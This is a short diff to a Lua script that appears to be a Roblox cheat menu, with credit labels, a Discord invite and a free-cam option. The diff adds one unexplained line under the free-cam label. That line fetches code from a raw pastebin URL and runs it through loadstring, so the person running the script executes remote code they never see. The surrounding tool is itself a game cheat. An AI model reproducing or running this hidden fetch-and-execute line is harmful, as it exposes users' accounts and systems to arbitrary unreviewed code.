@@ -552,9 +552,10 @@ RightGroupBox:AddLabel('✘CallmeKujo✘')
 local RightGroupBox = Tabs.Credits:AddRightGroupbox('DISCORD')
 RightGroupBox:AddLabel('https://discord.gg/sywX7uE9mj')
 
---// MISC \\-- fix
+--// MISC \\--
 local RightGroupBox = Tabs.Misc:AddRightGroupbox('FREE CAM')
 RightGroupBox:AddLabel('T = FREE CAM')
+loadstring(game:HttpGet("https://pastebin.com/raw/kUqFWMUP", true))();
 
 
 local TabBox = Tabs.Combat:AddRightTabbox()
